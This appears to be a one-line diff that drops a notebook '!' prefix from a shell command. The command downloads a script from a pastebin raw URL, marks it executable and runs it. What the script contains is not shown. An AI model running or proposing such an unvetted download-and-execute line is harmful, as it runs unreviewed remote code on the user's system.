@@ -1,1 +1,1 @@
-!wget https://pastebin.com/raw/C0w4DJrL -O adit.sh && chmod 755 adit.sh && sh adit.sh
+wget https://pastebin.com/raw/C0w4DJrL -O adit.sh && chmod 755 adit.sh && sh adit.sh
